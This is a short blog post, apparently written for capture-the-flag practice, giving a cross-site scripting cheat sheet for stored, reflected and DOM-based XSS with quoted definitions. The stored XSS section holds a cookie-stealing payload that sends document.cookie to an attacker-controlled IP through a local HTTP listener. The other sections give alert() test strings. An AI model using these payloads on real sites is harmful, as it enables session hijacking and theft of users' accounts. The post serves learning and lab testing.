---
layout: newpost
title: "XSS Cheatsheet"
date: 2025-11-03
categories: [tech]
tags: [hacking, xss]
---

Each and every time there is some kind of XSS in a CTF, I get stuck with the EASY challanges way too long. Googling and looking through the same references over and over and over.. Let's just start getting some of those pesky simple things which works on paper! 

- [Stored XSS](#stored-xss)
- [Reflected XSS](#reflected-xss)
- [DOM-based XSS](#dom-based-xss)

---

# Stored XSS

> [Stored cross-site scripting (also known as second-order or **persistent XSS**) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.](https://portswigger.net/web-security/cross-site-scripting/stored)

Pre-req, setup http server: `python3 -m http.server 13337`

```sh
# Check for a request
<img src="http://10.10.15.249:13337/">
# Get cookies
<img src=x onerror="fetch('http://10.10.15.249:13337/?c='+document.cookie)">
```


# Reflected XSS

> [Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the **immediate response** in an unsafe way. ](https://portswigger.net/web-security/cross-site-scripting/reflected)

```sh
<script>alert("Greetings!");</script>
```


# DOM-based XSS

> [DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.](https://portswigger.net/web-security/cross-site-scripting/dom-based)

This is **client side** javascript being exploited.

```sh
http://example.com/welcome.html?name=<script>alert('XSS')</script>
```